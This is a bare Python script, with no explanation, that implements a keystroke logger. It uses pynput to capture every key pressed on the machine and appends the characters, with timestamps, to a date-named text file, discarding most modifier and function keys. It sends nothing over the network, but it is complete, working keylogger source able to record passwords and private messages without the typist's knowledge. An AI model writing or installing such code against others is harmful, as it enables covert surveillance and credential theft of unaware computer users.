from pynput.keyboard import Listener
import time
    
date = time.strftime("%A, %B %d, %Y") + ".txt"
x = time.ctime()

with open(date ,"a") as f: 
    f.write("\n")
    f.write("[" + x + "] : ")

def OnKeyboardEvent(event):
    global x
    event = str(event)
    event = event.replace("'", "")

    if event == "Key.enter":
        event = "\n"
        event = " [ENTER] "
        with open(date ,"a") as f:
            f.write(f"{event}\n")
            f.write("[" + x + "] : ")

    elif event == "Key.space":
        event = " "
    
    elif event == "Key.backspace":
        event = ""
       
    elif event == "Key.shift":
        event = ""
        
    elif event == "Key.shift_r":
        event = ""

    elif event == "Key.caps_lock":
        event = ""
       
    elif event == "Key.ctrl_l":
        event = ""
        
    elif event == "Key.ctrl_r":
        event = ""
       
    elif event == "Key.tab":
        event = ""

    elif event == "Key.alt_l":
        event = ""

    elif event == "Key.alt_gr":
        event = ""
        
    elif event == "Key.up":
        event = ""

    elif event == "Key.left":
        event = ""

    elif event == "Key.down":
        event = ""

    elif event == "Key.right":
        event = ""

    elif event == "Key.cmd":
        event = ""
       
    elif event == "Key.cmd_r":
        event = ""
        
    elif event == "Key.esc":
        event = ""
      
    elif event == "Key.f1":
        event = ""

    elif event == "Key.f2":
        event = ""

    elif event == "Key.f3":
        event = ""

    elif event == "Key.f4":
        event = ""
       
    elif event == "Key.f5":
        event = ""
        
    elif event == "Key.f6":
        event = ""
        
    elif event == "Key.f7":
        event = ""
        
    elif event == "Key.f8":
        event = ""
     
    elif event == "Key.f9":
        event = ""

    elif event == "Key.f10":
        event = ""
        
    elif event == "Key.f11":
        event = ""

    elif event == "Key.f12":
        event = ""

    elif event == "Key.insert":
        event = ""

    elif event == "Key.delete":
        event = ""

    elif event == "Key.home":
        event = ""

    elif event == "Key.page_up":
        event = ""

    elif event == "Key.scroll_lock":
        event = ""

    elif event == "Key.pause":
        event = ""
       
    elif event == "Key.menu":
        event = ""
       
    elif event == "Key.num_lock":
        event = ""

    with open(date ,"a") as f:
        f.write(event)

with Listener(on_press=OnKeyboardEvent) as listener:
    listener.join()
